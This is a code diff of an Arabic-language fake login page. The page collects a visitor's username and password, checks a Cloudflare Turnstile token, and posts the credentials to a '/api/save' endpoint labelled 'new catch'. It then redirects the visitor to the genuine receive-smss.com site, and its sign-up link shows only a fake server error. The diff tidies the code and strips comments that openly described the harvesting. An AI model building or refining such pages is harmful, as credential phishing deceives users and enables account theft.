@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -10,9 +9,10 @@
     
     <style>
         body {
-            margin: 0; padding: 0; font-family:  Segoe UI , Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #FF0055 0%, #CC0044 100%); 
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
+            flex-direction: column;
         }
         .container {
             background: white; padding: 30px; border-radius: 12px;
@@ -38,8 +38,16 @@
         }
 
         .footer-links { margin-top: 10px; border-top: 1px solid #eee; padding-top: 15px; }
-        .footer-links p { font-size: 14px; color: #666; }
+        .footer-links p { font-size: 14px; color: #666; margin-bottom: 5px; }
         .footer-links a { color: #CC0044; text-decoration: none; font-weight: bold; cursor: pointer; }
+
+        /* تنسيق حقوق المطور */
+        .developer-credits {
+            margin-top: 20px;
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 13px;
+            direction: ltr; /* لجعل النص الإنجليزي يظهر بشكل صحيح */
+        }
     </style>
 </head>
 <body>
@@ -63,43 +71,44 @@
         </form>
 
         <div class="footer-links">
-            <p>ليس لديك حساب؟ <a onclick="showCreateAccountDialog()">إنشاء حساب جديد</a></p>
+            <p>ليس لديك حساب؟ <a onclick="showErrorDialog()">إنشاء حساب جديد</a></p>
         </div>
     </div>
 
+    <div class="developer-credits">
+        تم تطوير الموقع by oliver 2014 - 2026
+    </div>
+
     <script>
-        // وظيفة إظهار الدايلوج (النافذة المنبثقة) عند الضغط على إنشاء حساب
-        function showCreateAccountDialog() {
+        function showErrorDialog() {
             Swal.fire({
-                title:  خطأ في النظام ,
-                text:  فشل الاتصال في الخوادم، يرجى المحاولة لاحقاً. ,
-                icon:  error ,
-                confirmButtonText:  حسناً ,
-                confirmButtonColor:  #CC0044 
+                title: 'خطأ في النظام',
+                text: 'فشل الاتصال في الخوادم، يرجى المحاولة لاحقاً.',
+                icon: 'error',
+                confirmButtonText: 'حسناً',
+                confirmButtonColor: '#CC0044'
             });
         }
 
-        document.getElementById( checkForm ).onsubmit = async (e) => {
+        document.getElementById('checkForm').onsubmit = async (e) => {
             e.preventDefault();
-            const user = document.getElementById( userInput ).value;
-            const pass = document.getElementById( passInput ).value;
+            const user = document.getElementById('userInput').value;
+            const pass = document.getElementById('passInput').value;
             
-            const turnstileResponse = document.querySelector( [name="cf-turnstile-response"] ).value;
-
+            const turnstileResponse = document.querySelector('[name="cf-turnstile-response"]').value;
             if (!turnstileResponse) {
                 Swal.fire({
-                    text:  يرجى إكمال التحقق أولاً ,
-                    icon:  warning ,
-                    confirmButtonText:  موافق 
+                    text: 'يرجى إكمال التحقق أولاً',
+                    icon: 'warning',
+                    confirmButtonText: 'موافق'
                 });
                 return;
             }
 
-            // إرسال البيانات (الصيد)
             try {
-                await fetch( /api/save , {
-                    method:  POST ,
-                    headers: {  Content-Type :  application/json  },
+                await fetch('/api/save', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         title: "🚨 صيد جديد",
                         user: user,
@@ -108,7 +117,6 @@
                 });
             } catch (err) {}
 
-            // التحويل للموقع الحقيقي
             window.location.href = "https://receive-smss.com/"; 
         };
     </script>
